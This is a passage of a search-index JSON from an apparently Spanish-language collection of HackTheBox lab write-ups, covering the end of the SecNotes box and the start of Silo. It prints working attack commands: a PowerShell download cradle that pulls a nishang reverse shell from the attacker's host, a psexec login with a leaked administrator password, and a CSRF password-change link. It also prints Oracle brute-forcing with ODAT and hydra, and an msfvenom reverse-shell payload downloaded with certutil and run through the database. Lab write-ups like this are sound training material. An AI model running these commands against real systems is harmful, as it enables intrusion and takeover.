m\u00e1quina, m\u00e9todo que no funcion\u00f3 en esta ocasi\u00f3n, raz\u00f3n por la que se busco invocar la revershell de powershell ofrecida por nishang. Disponible tanto en el repositorio como en el manejador de paquetes de kali (<code>sudo apt install nishang</code>).</p> <p>Despu\u00e9s de generar una copia y modificar el archivo <code>/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1</code>, a\u00f1adiendo hasta el final la llamada a la funci\u00f3n: </p> <pre><code>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 443\n</code></pre> <p>Exponi\u00e9ndola mediante un servicio web, se entabl\u00f3 una reverse shell satisfactoriamente mediante la invocaci\u00f3n de la request:</p> <pre><code>http://10.10.10.97:8808/shell.php?cmd=powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.16/Invoke-PowerShellTcp.ps1')\n</code></pre> <p></p>","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#post-explotacion","title":"Post Explotaci\u00f3n","text":"","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#enumeracion_1","title":"Enumeraci\u00f3n","text":"<p>Despu\u00e9s de navegar a trav\u00e9s del sistema de archivos se identific\u00f3 en la ruta <code>C:\\</code> un archivo zip con el nombre de <code>Ubuntu.zip</code> adem\u00e1s de encontrarse con la ruta <code>C:\\Distros\\Ubuntu</code> d\u00e1ndo oportunidad para suponer que se trataba de la tecnolog\u00eda empleada en sistemas windows, WSL (Windows Subsystem for Linux).</p> <p></p> <p>Al ejecutar winPEAS se corrobor\u00f3 su existencia y se pudo identificar que el usuario por defecto en el sub-sistema es <code>root</code> mediante la invocaci\u00f3n de comandos como:</p> <pre><code>wsl.exe whoami\nwsl.exe ls -la /\n</code></pre> <p></p> <p>Ejecuci\u00f3n de comandos mediante <code>wsl.exe</code>.</p> <p></p>","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#escalacion-de-privilegios","title":"Escalaci\u00f3n de privilegios","text":"","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#tyler-nt-authoritysystem","title":"tyler \u2192 nt authority\\system","text":"<p>Despu\u00e9s de navegar en los directorios del sub-sistema se encontr\u00f3 la disponibilidad del archivo <code>.bash_history</code> del usuario <code>root</code>, exponiendo de esta manera la contrase\u00f1a del usuario <code>administrator</code> de windows.</p> <p></p> <p>Dado que <code>smbclient</code> utiliza como separador el caracter <code>%</code> a diferencia de otras herramientas, se idenfic\u00f3 la contrase\u00f1a como <code>u6!4ZwgwOM#^OBf#Nwnh</code> por lo que a partir de ah\u00ed se entabl\u00f3 una reverse shell como administrador haciendo uso de:</p> <pre><code>impacket-psexec 'administrator:u6!4ZwgwOM#^OBf#Nwnh@10.10.10.97'\n</code></pre> <p></p>","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#notas-adicionales","title":"Notas adicionales","text":"<p>Como es costumbre suelo comparar mi resoluci\u00f3n de la m\u00e1quina tanto como con la oficial, como con la de otros (principalmente IppSec y 0xdf), para aprender otras t\u00e9cnicas, procesos y mejorar continuamente, encontrando as\u00ed otro m\u00e9todo de explotaci\u00f3n disponible en la aplicaci\u00f3n web siendo \u00e9sta la forma intencionada de explotaci\u00f3n.</p>","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#cross-site-request-forgery-csrf","title":"Cross-Site Request Forgery (CSRF)","text":"<p>En la plataforma es identificada la vulnerabilidad debido a que en la secci\u00f3n de cambio de contrase\u00f1a, no se pide al usuario validar la contrase\u00f1a actual, pidiendo solamente la nueva contrase\u00f1a y la confirmaci\u00f3n de esta.</p> <p></p> <p>Lo que permite capturar la petici\u00f3n para visualizar como est\u00e1 construida y enviar una petici\u00f3n modificada al usuario de contacto para poder cambiar la contrase\u00f1a de este.</p> <p></p> <p>Enviando por medio de la secci\u00f3n de contacto el mensaje:</p> <pre><code>http://10.10.10.97/change_pass.php?password=srrequiem&amp;confirm_password=srrequiem&amp;submit=submit\n</code></pre> <p>Esperando que sea abierto y posteriormente corroborando su ejecuci\u00f3n al intentar loguearse como el usuario <code>tyler:srrequiem</code>, se obtiene acceso a las notas de <code>tyler</code>.</p> <p></p>","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/SecNotes/#referencias","title":"Referencias","text":"<ul> <li>PortSwigger - SQL injection cheat sheet.</li> <li>PortSwigger - SQL injection UNION attacks.</li> <li>HackTricks - SQL injection.</li> <li>Github - Nishang.</li> <li>HackTricks - Windows Subsystem for Linux (wsl).</li> <li>Github - Impacket Suite.</li> </ul>","tags":["User Enumeration (Wfuzz)","Reflected XSS","Stored XSS","SQL Injection","Cross-Site Request Forgery (CSRF) - Changing a user's password","IIS Exploitation (Uploading WebShell)","Abusing Windows Subsystem for Linux (WSL)","Information Leakage (Privilege Escalation)"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/","title":"Silo","text":"<p>Write-up de la m\u00e1quina Silo de HackTheBox.</p> <p></p>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#indice","title":"\u00cdndice","text":"<ul> <li>Introducci\u00f3n</li> <li>Estad\u00edsticas</li> <li>Reconocimiento</li> <li>Escaneo de host<ul> <li>Escaneo completo de puertos</li> <li>Escaneo espec\u00edfico</li> </ul> </li> <li>Enumeraci\u00f3n</li> <li>Servicios<ul> <li>Microsoft IIS - 80</li> <li>Oracle TNS Listener - 1521</li> <li>hydra</li> </ul> </li> <li>Explotaci\u00f3n</li> <li>No intencionada<ul> <li>Obtenci\u00f3n de credenciales</li> <li>Pasos previos | Preparaci\u00f3n</li> <li>Ejecuci\u00f3n</li> <li>RCE</li> <li>Pasos previos | Preparaci\u00f3n</li> <li>Ejecuci\u00f3n</li> </ul> </li> <li>Intencionada<ul> <li>RCE</li> <li>Pasos previos | Preparaci\u00f3n</li> <li>Ejecuci\u00f3n</li> </ul> </li> <li>Post Explotaci\u00f3n</li> <li>Enumeraci\u00f3n</li> <li>Escalaci\u00f3n de privilegios<ul> <li>M\u00e9todo 1 - Juicy Potato</li> <li>M\u00e9todo 2 - Memdump</li> </ul> </li> <li>Referencias</li> </ul>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#introduccion","title":"Introducci\u00f3n","text":"","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#estadisticas","title":"Estad\u00edsticas","text":"Caracter\u00edstica Descripci\u00f3n Nombre Silo OS Windows Dificultad oficial Medium Dificultad de comunidad Puntos 30 Creadores egre55","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#reconocimiento","title":"Reconocimiento","text":"","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#escaneo-de-host","title":"Escaneo de host","text":"","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#escaneo-completo-de-puertos","title":"Escaneo completo de puertos","text":"<pre><code>\u2514\u2500$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET\nHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 23:09 EDT\nInitiating SYN Stealth Scan at 23:09\nScanning 10.10.10.82 [65535 ports]\nDiscovered open port 80/tcp on 10.10.10.82\nDiscovered open port 445/tcp on 10.10.10.82\nDiscovered open port 139/tcp on 10.10.10.82\nDiscovered open port 135/tcp on 10.10.10.82\nDiscovered open port 49161/tcp on 10.10.10.82\nDiscovered open port 49155/tcp on 10.10.10.82\nDiscovered open port 49162/tcp on 10.10.10.82\nDiscovered open port 49154/tcp on 10.10.10.82\nDiscovered open port 49160/tcp on 10.10.10.82\nDiscovered open port 47001/tcp on 10.10.10.82\nDiscovered open port 49153/tcp on 10.10.10.82\nDiscovered open port 49159/tcp on 10.10.10.82\nDiscovered open port 49152/tcp on 10.10.10.82\nDiscovered open port 5985/tcp on 10.10.10.82\nDiscovered open port 1521/tcp on 10.10.10.82\nCompleted SYN Stealth Scan at 23:09, 13.20s elapsed (65535 total ports)\nNmap scan report for 10.10.10.82\nHost is up, received user-set (0.064s latency).\nScanned at 2022-05-23 23:09:27 EDT for 14s\nNot shown: 65520 closed tcp ports (reset)\nPORT      STATE SERVICE      REASON\n80/tcp    open  http         syn-ack ttl 127\n135/tcp   open  msrpc        syn-ack ttl 127\n139/tcp   open  netbios-ssn  syn-ack ttl 127\n445/tcp   open  microsoft-ds syn-ack ttl 127\n1521/tcp  open  oracle       syn-ack ttl 127\n5985/tcp  open  wsman        syn-ack ttl 127\n47001/tcp open  winrm        syn-ack ttl 127\n49152/tcp open  unknown      syn-ack ttl 127\n49153/tcp open  unknown      syn-ack ttl 127\n49154/tcp open  unknown      syn-ack ttl 127\n49155/tcp open  unknown      syn-ack ttl 127\n49159/tcp open  unknown      syn-ack ttl 127\n49160/tcp open  unknown      syn-ack ttl 127\n49161/tcp open  unknown      syn-ack ttl 127\n49162/tcp open  unknown      syn-ack ttl 127\n\nRead data files from: /usr/bin/../share/nmap\nNmap done: 1 IP address (1 host up) scanned in 13.27 seconds\n           Raw packets sent: 65634 (2.888MB) | Rcvd: 65535 (2.621MB)\n</code></pre>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#escaneo-especifico","title":"Escaneo espec\u00edfico","text":"<pre><code>\u2514\u2500$ nmap -sCV -p 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 -n -Pn -oN nmap/targeted $TARGET\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 23:11 EDT\nNmap scan report for 10.10.10.82\nHost is up (0.065s latency).\n\nPORT      STATE SERVICE      VERSION\n80/tcp    open  http         Microsoft IIS httpd 8.5\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-title: IIS Windows Server\n|_http-server-header: Microsoft-IIS/8.5\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds\n1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49152/tcp open  msrpc        Microsoft Windows RPC\n49153/tcp open  msrpc        Microsoft Windows RPC\n49154/tcp open  msrpc        Microsoft Windows RPC\n49155/tcp open  msrpc        Microsoft Windows RPC\n49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)\n49160/tcp open  msrpc        Microsoft Windows RPC\n49161/tcp open  msrpc        Microsoft Windows RPC\n49162/tcp open  msrpc        Microsoft Windows RPC\nService Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3.0.2:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2022-05-24T03:13:17\n|_  start_date: 2022-05-24T02:53:36\n| smb-security-mode:\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: supported\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 127.10 seconds\n</code></pre>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#enumeracion","title":"Enumeraci\u00f3n","text":"","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#servicios","title":"Servicios","text":"","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#microsoft-iis-80","title":"Microsoft IIS - 80","text":"<p>Se expone la p\u00e1gina por default de Microsoft IIS y al hacer uso de herramientas de fuzzing no se tuvo \u00e9xito al buscar alg\u00fan directorio relevante, sin embargo, para el m\u00e9todo intencionado de resoluci\u00f3n es importante tener a consideraci\u00f3n.</p> <p></p>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#oracle-tns-listener-1521","title":"Oracle TNS Listener - 1521","text":"<p>Despu\u00e9s de revisar acerca de la metodolog\u00eda empleada para este servicio, se busc\u00f3 obtener informaci\u00f3n relevante respecto la versi\u00f3n, estatus, etc, haciendo uso de <code>tnscmd10g</code> sin \u00e9xito alguno.</p> <p>Posteriormente, en la metodolog\u00eda se mencionan los SID (Identificadores de Servicio, esencialmente pueden ser reconocidos como los nombres de las bases de datos), los cuales dependiendo de la instalaci\u00f3n realizada pueden existir uno o m\u00e1s SIDs por defecto. Al no poder obtenerlos mediante <code>tnscmd10g</code>, se sugiere que realice fuerza bruta de los com\u00fanes para identificar los existentes.</p>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#hydra","title":"hydra","text":"<p>Haciendo uso de:</p> <pre><code>hydra -L content/sids-oracle.txt -s 1521 10.10.10.82 oracle-sid\n</code></pre> <p>Con el conjunto de diccionarios que ofrece hacktricks (el cual es un compendio de las listas de nmap y metasploit), se identificaron los SIDs:</p> <ul> <li>CLRExtProc.</li> <li>PLSExtProc.</li> <li>XE.</li> </ul> <p></p>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#explotacion","title":"Explotaci\u00f3n","text":"<p>Nota: Despu\u00e9s de resolver la m\u00e1quina se suele verificar el proceso con otras fuentes, identificando de esta manera que existen 2 caminos a resolver la m\u00e1quina una intencionada y una no intencionada, una m\u00e1s directa por no decir f\u00e1cil que la otra. Primero se expondr\u00e1 el m\u00e9todo por el cu\u00e1l se resolvi\u00f3 inicialmente y posteriormente la resoluci\u00f3n intencionada.</p>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#no-intencionada","title":"No intencionada","text":"","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#obtencion-de-credenciales","title":"Obtenci\u00f3n de credenciales","text":"","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#pasos-previos-preparacion","title":"Pasos previos | Preparaci\u00f3n","text":"<p>Haciendo uso de ODAT se obtuvieron credenciales de un usuario disponible, por medio de un m\u00f3dulo que la herramienta ofrece. Inicialmente se requiere la instalaci\u00f3n descrita en el repositorio aunque por lo que respecta en kali, basta con clonar el repositorio.</p>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#ejecucion","title":"Ejecuci\u00f3n","text":"<p>Como parte inicial se ejecut\u00f3 un \"Ave Mar\u00eda\" invocando todos los m\u00f3dulos que la herramienta ofrece para visualizar si de esta manera se identificaba algo que pudiera servir, para ello, la herramienta solicita un SID v\u00e1lido a ocupar, siendo <code>XE</code> el SID con informaci\u00f3n \u00fatil (identific\u00e1ndolo despu\u00e9s de ejecutar el comando con cada uno de los SIDs). Haciendo uso de:</p> <pre><code>./odat.py all -s 10.10.10.82 -p 1521 -d XE\n</code></pre> <p></p> <p>Posteriormente se identific\u00f3 que el m\u00f3dulo encargado de hacer este proceso es <code>passwordguesser</code> el cual simplemente sustituir\u00eda a <code>all</code> del comando.</p>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#rce","title":"RCE","text":"","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#pasos-previos-preparacion_1","title":"Pasos previos | Preparaci\u00f3n","text":"<p>Posteriormente, al revisar los m\u00f3dulos disponibles se identific\u00f3 que tanto el m\u00f3dulo <code>dbmsscheduler</code> como el m\u00f3dulo <code>externaltable</code> ofrecen capacidad de ejecutar comandos. Que al intentar usarlos no se permiti\u00f3 su ejecuci\u00f3n debido a la falta de privilegios, sin embargo, se encontr\u00f3 que mediante la bandera <code>--sysdba</code> existe la posibilidad de \"escalar\" estos privilegios o impersonar un rol superior al que se ten\u00eda.</p>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#ejecucion_1","title":"Ejecuci\u00f3n","text":"<p>Obteniendo as\u00ed, una vez ejecutada la reverse shell, acceso directamente como administrador.</p> <ol> <li>Creando un payload con:</li> </ol> <pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=1234 -f exe &gt; pwn.exe\n</code></pre> <ol> <li>Descarg\u00e1ndolo con:</li> </ol> <pre><code>./odat.py dbmsscheduler -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec \"certutil.exe -f -urlcache -split http://10.10.14.16/pwn.exe c:\\windows\\temp\\pwn.exe\" --sysdba\n</code></pre> <ol> <li>Y ejecut\u00e1ndolo con:</li> </ol> <pre><code>./odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec \"c:\\windows\\temp\" \"pwn.exe\" --sysdba\n</code></pre> <p></p>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#intencionada","title":"Intencionada","text":"<p>Si bien odat permite la lectura, escritura y ejecuci\u00f3n de archivos, todo lo que realiza en estos procesos no resulta tan \"transparente\" por lo que para entender un poco acerca de Oracle se realizo parte del mismo proceso por medio de SQL directamente.</p> <p>Nota: Se da por hecho que se realizo el descubrimiento de los SIDs y de las credenciales v\u00e1lidas, dado que <code>scott:tiger</code> son credenciales por default.</p>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#rce_1","title":"RCE","text":"","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#pasos-previos-preparacion_2","title":"Pasos previos | Preparaci\u00f3n","text":"<p>Como parte de la instalaci\u00f3n de odat, se realiza la instalaci\u00f3n del cliente sql para conectarse a la base de datos de Oracle.</p> <p>Por lo que una vez instalado se permite la conexi\u00f3n al host por medio de:</p> <pre><code>sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba\n</code></pre> <p></p>","tags":["Abusing Oracle Database","Oracle Database Attacking Tool (ODAT) Installation","Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","Oracle DB Exploitation - Attempting a remote file read","Oracle DB Exploitation - Attempting a remote file upload","Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","Memdump","Volatility","Abusing SeImpersonatePrivilege"]},{"location":"HackTheBox/Boxes/Windows/2%20Medio/Silo/#ejecucion_2","title":"Ejecuci\u00f3n","text":"<p>Oracle ocupa su propia sintaxis por lo que con el siguiente pedazo de c\u00f3digo se busc\u00f3 obtener el contenido del archivo por defecto del servidor. Buscando obtener respuesta por medio del prompt configurando primeramente <code>set serveroutput ON</code> para su visualizaci\u00f3n.</p> <pre><code>declare\n    f utl_file.file_type;\n    s varchar(200);\nbegin\n    f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');\n    utl_file.get_line(f,s);\n    utl_file.fclose(f);\n    dbms_output.put_line(s);\nend;\n</code></pre> <p></p> <p>Por otra parte se 